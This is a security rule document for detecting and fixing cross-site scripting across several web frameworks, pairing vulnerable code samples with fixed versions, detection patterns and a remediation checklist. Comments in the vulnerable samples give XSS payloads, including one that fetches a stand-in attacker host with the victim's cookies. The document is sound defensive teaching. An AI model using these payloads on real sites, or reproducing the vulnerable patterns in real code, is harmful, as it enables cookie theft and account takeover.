---
title: Cross-Site Scripting (XSS) Prevention
severity: HIGH
category: Security
---

# Security Rule: Cross-Site Scripting (XSS) Prevention

## What to Detect

Identify code that renders user-supplied content without proper sanitization or escaping, creating XSS vulnerabilities that allow attackers to inject malicious scripts.

### XSS Attack Types

**1. Reflected XSS (Non-Persistent)**
- User input immediately reflected in response
- Example: Search query displayed on results page
- Delivered via URL, email, or form submission

**2. Stored XSS (Persistent)**
- User input stored and later displayed to other users
- Example: Comment fields, profile information
- Most dangerous - affects multiple users

**3. DOM-Based XSS**
- JavaScript manipulates DOM with unsanitized user input
- Happens entirely client-side
- Example: `innerHTML`, `document.write()`, `eval()`

## Why It Matters

**Security Risks:**
- 🔓 Session hijacking (steal cookies/tokens)
- 👤 Account takeover
- 🎣 Phishing attacks via trusted domain
- 💾 Data theft (keylogging, form interception)
- 🦠 Malware distribution
- 🌐 Website defacement

**Compliance Violations:**
- **OWASP Top 10:** #3 Injection (includes XSS)
- **PCI-DSS 6.5.7:** Cross-site scripting (XSS)
- **HIPAA §164.312(a)(1):** Access Control
- **SOC2 CC6.1:** Logical and Physical Access Controls
- **CWE-79:** Improper Neutralization of Input During Web Page Generation

**Real-World Impact:**
- 40% of web attacks involve XSS
- Average cost of breach: $4.35M
- Can bypass CSP if misconfigured
- Used in combination with other attacks

**Famous Examples:**
- eBay XSS (2014): Persistent XSS on product listings
- British Airways (2018): XSS in payment form → 380K cards stolen
- MySpace Samy Worm (2005): 1M friends added in 24 hours

## Examples of Violations

### ❌ BAD: React/TypeScript - dangerouslySetInnerHTML

```typescript
// NEVER do this with user input!
function UserProfile({ bio }: { bio: string }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: bio }} />
    // If bio = "<script>alert('XSS')</script>", it executes!
  );
}

// Even with markdown, still vulnerable
function Comment({ markdown }: { markdown: string }) {
  const html = marked(markdown);  // Converts markdown to HTML
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
  // Attacker can inject: <img src=x onerror="alert('XSS')">
}
```

### ❌ BAD: Vanilla JavaScript - innerHTML

```javascript
// Direct innerHTML assignment
const searchTerm = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = `
  <h2>Results for: ${searchTerm}</h2>
`;
// Attack: ?q=<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">

// Event handler injection
const username = getUserInput();
element.innerHTML = `<button onclick="greet('${username}')">Greet</button>`;
// Attack: username = "'); maliciousFunc(); ('"

// Direct DOM manipulation
const comment = getCommentFromDB();
document.write(comment);  // NEVER use document.write with user input!
```

###❌ BAD: Vue.js - v-html Directive

```vue
<template>
  <!-- Unsafe rendering -->
  <div v-html="userBio"></div>
  
  <!-- Markdown rendered without sanitization -->
  <div v-html="renderMarkdown(userComment)"></div>
</template>

<script>
export default {
  props: ['userBio', 'userComment'],
  methods: {
    renderMarkdown(text) {
      return marked(text);  // Vulnerable!
    }
  }
}
</script>
```

### ❌ BAD: Angular - bypassSecurityTrustHtml

```typescript
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  template: `<div [innerHTML]="trustedHtml"></div>`
})
export class ProfileComponent {
  trustedHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {
    // Bypassing Angular's built-in protection!
    this.trustedHtml = sanitizer.bypassSecurityTrustHtml(userInput);
  }
}
```

### ❌ BAD: Server-Side Rendering (Node.js/Express)

```typescript
// Template injection
app.get('/welcome', (req, res) => {
  const name = req.query.name;
  res.send(`<h1>Welcome, ${name}!</h1>`);
  // Attack: ?name=<script>alert('XSS')</script>
});

// EJS template without escaping
// welcome.ejs
<h1>Welcome, <%- username %>!</h1>  // <%- unescaped! Should be <%=

// Handlebars triple-stash (unescaped)
<div>{{{ userContent }}}</div>  // Three braces = unescaped
```

### ❌ BAD: URL Manipulation

```javascript
// Href injection
const userId = getUserInput();
element.href = `https://example.com/profile?id=${userId}`;
// Attack: userId = "1#javascript:alert('XSS')"

// redirectTo parameter
const redirect = new URLSearchParams(location.search).get('redirect');
window.location = redirect;
// Attack: ?redirect=javascript:alert(document.cookie)
```

## How to Fix

### ✅ GOOD: React - Default Escaping

```typescript
// React escapes by default - SAFE!
function UserProfile({ name, bio }: Props) {
  return (
    <div>
      <h1>{name}</h1>
      <p>{bio}</p>
      {/* Even if bio contains <script>, it's rendered as text */}
    </div>
  );
}

// For rich text, sanitize first
import DOMPurify from 'dompurify';

function RichComment({ markdown }: { markdown: string }) {
  const html = marked(markdown);
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### ✅ GOOD: Vanilla JavaScript - textContent & createElement

```javascript
// Use textContent instead of innerHTML
const searchTerm = new URLSearchParams(window.location.search).get('q');
const heading = document.createElement('h2');
heading.textContent = `Results for: ${searchTerm}`;  // SAFE!
document.getElementById('results').appendChild(heading);

// Or use template with escaping
const escapeHtml = (unsafe: string): string => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

element.innerHTML = `<h2>Results for: ${escapeHtml(searchTerm)}</h2>`;

// Sanitize HTML with DOMPurify
import DOMPurify from 'isomorphic-dompurify';

const dirtyHtml = getUserContent();
const clean = DOMPurify.sanitize(dirtyHtml);
element.innerHTML = clean;  // Now safe
```

### ✅ GOOD: Vue.js - Default Escaping

```vue
<template>
  <!-- Safe by default -->
  <div>
    <h1>{{ userBio }}</h1>
    <p>{{ userComment }}</p>
  </div>
  
  <!-- For rich content, sanitize -->
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'isomorphic-dompurify';
import { marked } from 'marked';

export default {
  props: ['userBio', 'userComment', 'richContent'],
  computed: {
    sanitizedContent() {
      const html = marked(this.richContent);
      return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
        ALLOWED_ATTR: ['href']
      });
    }
  }
}
</script>
```

### ✅ GOOD: Angular - Default Sanitization

```typescript
import { Pipe, PipeTransform } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import DOMPurify from 'isomorphic-dompurify';

// Custom sanitization pipe
@Pipe({ name: 'sanitizeHtml' })
export class SanitizeHtmlPipe implements PipeTransform {
  constructor(private sanitizer: DomSanitizer) {}
  
  transform(value: string): SafeHtml {
    const cleaned = DOMPurify.sanitize(value, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
      ALLOWED_ATTR: []
    });
    return this.sanitizer.bypassSecurityTrustHtml(cleaned);
  }
}

// Usage in template
@Component({
  template: `
    <!-- Safe by default -->
    <div>{{ userContent }}</div>
    
    <!-- For HTML, use sanitization pipe -->
    <div [innerHTML]="richContent | sanitizeHtml"></div>
  `
})
export class ContentComponent {}
```

### ✅ GOOD: Server-Side (Node.js/Express)

```typescript
import express from 'express';
import escape from 'lodash/escape';
import DOMPurify from 'isomorphic-dompurify';

app.get('/welcome', (req, res) => {
  const name = escape(req.query.name as string);
  res.send(`<h1>Welcome, ${name}!</h1>`);  // SAFE - escaped
});

// With template engine - use escaping syntax
// EJS: Use <%= (escaped) not <%- (unescaped)
res.render('welcome', { username: req.query.name });  // EJS escapes with <%=

// welcome.ejs
<h1>Welcome, <%= username %>!</h1>  // Safe!

// Handlebars - use {{}} (escaped) not {{{}}} (unescaped)
<div>{{userContent}}</div>  // Safe!

// For rich content from database
app.get('/post/:id', async (req, res) => {
  const post = await db.posts.findById(req.params.id);
  
  // Sanitize before sending
  const cleanContent = DOMPurify.sanitize(post.content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOWED_URI_REGEXP: /^https?:\/\//,  // Only http/https links
  });
  
  res.render('post', { content: cleanContent });
});
```

### ✅ GOOD: URL Validation

```typescript
// Validate URLs before using them
function isValidUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    // Only allow http/https protocols
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// Safe redirect
const redirectTo = req.query.redirect as string;
if (redirectTo && isValidUrl(redirectTo)) {
  const url = new URL(redirectTo);
  // Whitelist allowed domains
  if (url.hostname === 'example.com' || url.hostname.endsWith('.example.com')) {
    res.redirect(redirectTo);
  } else {
    res.redirect('/');  // Default safe redirect
  }
} else {
  res.redirect('/');
}

// Safe href assignment
const userId = escapeHtml(userInput);
element.href = `https://example.com/profile?id=${encodeURIComponent(userId)}`;
```

### ✅ GOOD: Content Security Policy (CSP)

```typescript
// Express middleware for CSP headers
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +  // Avoid 'unsafe-inline' if possible
    "img-src 'self' data: https:; " +
    "font-src 'self' data:; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self';"
  );
  next();
});

// Helmet.js for comprehensive security headers
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],  // Avoid 'unsafe-inline'
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  xssFilter: true,
  noSniff: true,
  referrerPolicy: { policy: 'same-origin' }
}));
```

### ✅ GOOD: Input Validation & Sanitization

```typescript
import validator from 'validator';

// Validate and sanitize input
function sanitizeUserInput(input: string, type: 'text' | 'email' | 'url'): string {
  // Remove leading/trailing whitespace
  let clean = input.trim();
  
  switch (type) {
    case 'email':
      if (!validator.isEmail(clean)) {
        throw new ValidationError('Invalid email');
      }
      return validator.normalizeEmail(clean) || clean;
      
    case 'url':
      if (!validator.isURL(clean, { protocols: ['http', 'https'] })) {
        throw new ValidationError('Invalid URL');
      }
      return clean;
      
    case 'text':
    default:
      // Escape HTML entities
      return validator.escape(clean);
  }
}

// Use in application
app.post('/profile', async (req, res) => {
  const bio = sanitizeUserInput(req.body.bio, 'text');
  const email = sanitizeUserInput(req.body.email, 'email');
  const website = sanitizeUserInput(req.body.website, 'url');
  
  await db.users.update(req.user.id, { bio, email, website });
  res.json({ success: true });
});
```

## Detection Patterns

Look for:

1. **Dangerous Methods:**
   - `dangerouslySetInnerHTML`
   - `innerHTML =`
   - `document.write()`
   - `eval()`
   - `v-html` (Vue)
   - `bypassSecurityTrust*` (Angular)
   - `<%- %>` (EJS)
   - `{{{ }}}` (Handlebars)

2. **User Input Sources:**
   - `req.query`, `req.params`, `req.body`
   - `window.location`, `URLSearchParams`
   - Database fields (stored XSS)
   - `getUserInput()`, `getFormData()`

3. **String Concatenation with HTML:**
   - Template literals with user data in HTML context
   - `+` concatenation building HTML strings

4. **URL Manipulations:**
   - `window.location = userInput`
   - `element.href = userInput`
   - Redirect to user-supplied URL

## Severity Assignment

**CRITICAL when:**
- Stored XSS (affects multiple users)
- In authentication/payment flows
- No CSP or other mitigations

**HIGH (default) when:**
- Reflected XSS
- DOM-based XSS
- Public-facing pages

**MEDIUM when:**
- Input has some validation (but insufficient)
- Limited impact (internal tool)
- CSP in place

## Auto-Fix Strategy

1. **React:**
   Replace `dangerouslySetInnerHTML` with `{text}` or add DOMPurify

2. **Vanilla JS:**
   Replace `innerHTML` with `textContent` or sanitize with DOMPurify

3. **Server-side:**
   Use escaping template syntax (`<%= %>` not `<%- %>`)

4. **Always:**
   Add DOMPurify for any HTML rendering from user input

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [PortSwigger: XSS](https://portswigger.net/web-security/cross-site-scripting)

## Remediation Checklist

- [ ] Replace `innerHTML` with `textContent` where possible
- [ ] Sanitize HTML with DOMPurify before rendering
- [ ] Use framework default escaping (React, Vue, Angular)
- [ ] Validate and escape all user input
- [ ] Implement Content Security Policy (CSP)
- [ ] Use `HTTPOnly` and `Secure` flags for cookies
- [ ] Validate URLs before redirects
- [ ] Never use `eval()` with user input
- [ ] Test with XSS payloads
- [ ] Enable XSS protection headers

---

**Golden Rule:** Treat all user input as malicious. Never trust, always sanitize!
